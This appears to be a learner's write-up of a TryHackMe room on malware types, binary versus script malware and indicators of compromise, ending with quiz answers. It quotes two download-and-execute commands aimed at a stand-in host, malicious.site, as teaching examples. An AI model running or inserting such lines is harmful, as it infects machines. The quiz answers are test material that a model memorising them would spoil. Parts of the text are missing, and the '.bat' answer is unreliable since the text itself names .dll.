<h2>Task 1 . Introduction</h2>
<p>Malware refers to software or code created to damage systems, steal information, or allow unauthorised access. It appears in many forms, each with different tactics and goals. Malware can affect businesses in many ways, from financial loss and stolen data to disrupted services and reputational damage. Knowing how malware works is one of the first steps in defending against it.<br>

SOC analysts are responsible for spotting and responding to suspicious activity. They review security alerts and decide what action to take based on the type of threat involved. Classifying malware correctly helps determine the correct response, such as isolating infected machines or investigating data theft. This room introduces the most common malware categories, explains how to tell them apart, and includes real-world examples to support learning.<br>

We'll cover key categories of malware, real-world examples, and the differences between binary and script-based threats.</p>

<h3>Learning Objectives</h3>
<p>

- Learn to classify common malware types based on their behaviour and purpose.<br>
- Understand how real-world malware operates.<br>

<h2>Task 2 . Malware Types</h2>
<p>Knowing the main types of malware and how they behave helps analysts spot threats quickly. Malware is not just a single thing; it comes in different categories, each with a specific purpose and attack method. By learning to identify these, teams can better respond to incidents and keep their environments safer.</p>

<h3>Malware Categories</h3>
<p>Below is a table summarising the most common malware categories, their main purpose, typical behaviour, and a real-world example for each. Some practical, scenario-based examples follow this to show how these types of malware appear in everyday incidents.</p>

<h2>Task 3 . Real-World Malware Examples</h2>
<p>Malware is not just a concept found in textbooks. Security teams deal with malware categories like spyware, ransomware, wipers, data stealers, keyloggers, and remote access trojans (RATs) in real incidents. Seeing how each type appears in actual attacks helps contextualise the theory and make the patterns easier to remember. We often refer to malware that relates to or is similar to each other as part of the same malware family.<br>

A malware family refers to a group of malicious programs that share the same origin or codebase and behave similarly. Grouping malware like this helps security teams apply known defences and improve detection and response. Below are short case studies for known malware and links to learn more.</p>

QakBot typically arrives through phishing emails with malicious attachments or links. Once inside a network, it establishes a connection to its command-and-control servers, enabling attackers to move laterally, steal data, or deploy additional malware. In 2023, QakBot was responsible for several high-profile incidents, and law enforcement agencies have issued warnings about its continued activity.<br><br><br><br>|<code>TA0002</code>, Execution<br><br><code>TA0006</code>, Credential Access<br><br><code>TA0011</code>, Command and Control<br><br><br><br>|

<h2>Task 4 . Binary vs Script Malware</h2>
<p>Malware can arrive in different forms. Two of the most common categories are binary malware (compiled executables) and script-based malware (written in scripting languages). Understanding the difference helps SOC analysts make better decisions when reviewing alerts or suspicious files.<br>

While script-based malware has become popular for its flexibility and ease of modification, executables remain widely used by attackers. They can offer more stability, support complex payloads, and are still effective in environments where security tools are misconfigured or outdated. Both types continue to be seen in real-world intrusions.</p>

<h3>Binary Malware</h3>
<p>Executable-based malware is typically delivered as compiled files such as <strong>.exe</strong> (<strong>Windows Executable</strong> or <strong>.dll</strong> (<strong>Dynamic Link Library</strong>. These files are created from source code and need to be run on a compatible operating system. Common delivery methods for binaries include email attachments (for example, invoice.pdf.exe), malicious downloads, removable media, or as part of another infection. Sometimes, attackers disguise executables by using misleading icons or hiding the real file extension. A way to identify an executable is through a checksum, since executables, once compiled and redistributed, do not change. For example, we can calculate the md5sum of a file and identify the malware regardless of any name or extension change. Each binary may contain hardcoded strings or byte sequences that can serve as unique identifiers. These are commonly used by antivirus and detection engines.</p>

<h3>Script-based Malware</h3>
<p>Script-based malware relies on scripts written in languages such as <strong>JavaScript</strong> (.js), <strong>Visual Basic Script</strong> (.vbs), <strong>Windows batch</strong> (.bat), or <strong>PowerShell</strong> (.ps1). Scripts can be easier for attackers to change and adapt. They often arrive as email attachments, within Office documents containing macros, or through malicious websites. For example, a user might open an email attachment called report.docm, which contains a macro that runs a hidden PowerShell script. Scripts are also popular for initial access, allowing an attacker to run code directly in memory without writing files to disk.</p>

<p>There are some clear warning signs that a script may be acting maliciously:<br>

- The script downloads or runs other files from the internet.<br>
- It makes changes to system settings or disables security tools.<br>
- It runs commands that are not usually part of standard operation, especially with encoded or obfuscated content.<br>
- The script unexpectedly launches other applications, such as PowerShell or CMD.</p>

<p>For example, below we can find an example of an unobfuscated bat script-based malware:<br>
<code>@echo off powershell -Command "Invoke-WebRequest http://malicious.site/payload.exe -OutFile C:\Users\Public\payload.exe" start C:\Users\Public\payload.exe</code></p>

<p>The script above downloads a malware executable and runs it on the victim’s machine. Similarly, we can find a similar example to this one in <strong>PowerShell</strong>:<br>
<code>powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"</code></p>

<p>The above runs a script from a remote server, often without leaving files behind.</p>

<h3>Script-based Example</h3>
<p>Let's now observe an obfuscated real malware. In this case, this example corresponds to the <strong>LummaStealer</strong>, a popular stealer coded in <strong>C</strong> that is being used as a <strong>MaaS</strong> (malware as a service). This example is from <strong>August 2025</strong>, and it's a sample used to deliver the malware.<br>

As we can observe, there's a lot of data if we scroll down. A function is declared <code>Swvldsp2195</code>, and then a huge variable full of data named <code>qble51</code></p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/5d18282a-297c-44db-aff4-78612666becb"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Finally, we can observe that, in the end, this data is <strong>base64 decrypted</strong> and executed in memory using a <strong>.NET</strong> assembly (to execute in memory and not disk), as shown below.</p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/c98dc318-37c7-4043-affd-561337bd5286"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>While the above is an easy-to-follow example, more obfuscated script-based malware is very common, and there is a wide variety of these threats. This shows us how threat actors may try to deliver and obfuscate malware within an organisation.</p>

<p><em>Answer the questions below</em><br>
<ol type="1.">
    <li>What command-line tool is frequently used by script-based malware to download payloads?&nbsp;&nbsp;&nbsp;<code>powershell</li></code></li>
    <li>Which file extension is commonly associated with malware and  Windows executables, other than .exe?&nbsp;&nbsp;&nbsp;<code>.bat</code></li>
    <li>Which malware type is more likely to leave identifiable byte patterns used by antivirus software?&nbsp;&nbsp;&nbsp;<code>binary</code></li>
</ol></p>

<h2>Task 6 . Conclusion</h2>
<p>Malware continues to be one of the most frequent threats defenders face, and understanding how to classify it helps improve detection and response. Throughout this room, different types of malware were introduced, including how they behave and appear in real-world incidents and how security teams can identify and categorise them. Users learned to distinguish between malware families such as spyware, ransomware, wipers, and keyloggers, and reviewed real case studies to help build intuition. The differences between binary and script-based malware were also covered, along with common delivery methods and indicators of compromise.</p>

<p>Key takeaways:<br>

- Learn how to identify and classify common types of malware.<br>
- Understand how malware behaves and spreads in real-world incidents.<br>
- Distinguish between binary and script-based malware formats.<br>
- Apply classification skills using alert analysis in a simulated SOC environment.</p>
